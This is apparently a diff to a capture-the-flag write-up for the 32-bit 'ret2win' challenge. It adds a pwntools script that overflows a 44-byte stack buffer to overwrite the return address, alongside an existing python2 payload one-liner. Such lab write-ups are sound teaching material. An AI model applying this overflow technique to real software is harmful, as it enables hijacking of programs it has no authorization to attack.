@@ -1,6 +1,7 @@
 # Contents
 - Task Description
 - 32 bit
+- 32 bit script
 - 64 bit
 
 ## Task Description
@@ -11,7 +12,7 @@ Call it by overwriting a saved return address on the stack.
 File checks:
 32 bit ELF with no canaries
 Checking function from within pwndbg.
-Three of intrest; main, pwnme, ret2win
+Three of interest; main, pwnme, ret2win
 
 For the exploit all that is needed is the buffer size and the location of the ret2win function.
 
@@ -34,6 +35,24 @@ python2 -c 'print "A"*44+"\x2c\x86\x04\x08"' > payload.32bit
 Run it against the binary. This works and gives out the flag.
 ```flag
 ROPE{a_placeholder_32byte_flag!}
+```
+
+## 32 bit script
+```python
+from pwn import *
+# buffer of 44 bytes
+
+location = 0x0804862c
+payload = flat(
+	asm('nop')*44,
+	location
+)
+io=process(['./ret2win32'])
+  
+io.sendlineafter('>',payload)
+io.recvuntil('Thank you!\n')
+flag= io.recvall()
+success(flag)
 ```
 
 ## 64 bit
